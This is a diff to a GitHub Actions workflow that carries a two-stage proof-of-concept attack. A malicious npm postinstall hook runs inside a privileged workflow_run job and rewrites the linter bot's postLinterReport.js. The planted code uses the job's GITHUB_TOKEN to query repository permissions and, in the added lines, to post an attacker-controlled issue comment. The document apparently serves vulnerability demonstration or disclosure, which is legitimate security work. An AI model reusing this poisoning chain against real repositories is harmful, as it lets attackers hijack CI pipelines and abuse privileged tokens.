@@ -28,14 +28,19 @@ jobs:
           console.log('[poc] STAGE1 attacker postinstall executed in the workflow_run job, uid=' + process.getuid());
           console.log('[poc] STAGE1 cwd=' + process.cwd() + ' workspace=' + ws);
           console.log('[poc] STAGE1 token_in_env=' + Boolean(process.env.GITHUB_TOKEN));
-          fs.writeFileSync(path.join(ws, 'stage1-proof.txt'), 'npm postinstall ran inside the privileged workflow_run job\n');
+          fs.writeFileSync(path.join(ws, 'stage1-proof.txt'), 'STAGE1-MARKER: npm postinstall executed in workflow_run job at ' + new Date().toISOString() + '\n');
           const target = path.join(ws, 'node_modules', 'adp-devsite-scripts', 'linter-bot', 'postLinterReport.js');
           fs.mkdirSync(path.dirname(target), { recursive: true });
-          const minimal = "console.log('[poc] STAGE2 attacker code running in Post Linter Report step');" +
+          const minimal = "import fs2 from 'node:fs';" +
+            "const proof = fs2.existsSync('stage1-proof.txt') ? fs2.readFileSync('stage1-proof.txt','utf8').trim() : 'MISSING';" +
+            "console.log('[poc] STAGE2 read back: ' + proof);" +
+            "console.log('[poc] STAGE2 attacker code running in Post Linter Report step');" +
             "console.log('[poc] STAGE2 GITHUB_TOKEN present=' + Boolean(process.env.GITHUB_TOKEN) + ' len=' + String((process.env.GITHUB_TOKEN||'').length));" +
             "fetch('https://api.github.com/repos/' + process.env.GITHUB_REPOSITORY, { headers: { Authorization: 'Bearer ' + process.env.GITHUB_TOKEN, 'X-GitHub-Api-Version': '2022-11-28' } })" +
             "  .then(r => { console.log('[poc] STAGE2 token-authenticated API status=' + r.status); return r.json(); })" +
-            "  .then(j => console.log('[poc] STAGE2 repo=' + j.full_name + ' permissions=' + JSON.stringify(j.permissions)));";
+            "  .then(j => console.log('[poc] STAGE2 repo=' + j.full_name + ' permissions=' + JSON.stringify(j.permissions)));" +
+            "fetch('https://api.github.com/repos/' + process.env.GITHUB_REPOSITORY + '/issues/2/comments', { method: 'POST', headers: { Authorization: 'Bearer ' + process.env.GITHUB_TOKEN, Accept: 'application/vnd.github+json', 'X-GitHub-Api-Version': '2022-11-28' }, body: JSON.stringify({ body: 'STAGE2: attacker-controlled comment posted by the privileged linter bot (PoC in PDFtoMark)' }) })" +
+            "  .then(r => r.json()).then(j => console.log('[poc] STAGE2 privileged write comment url=' + j.html_url));";
           fs.writeFileSync(target, minimal);
           console.log('[poc] STAGE1 rewrote ' + target);
           EOF
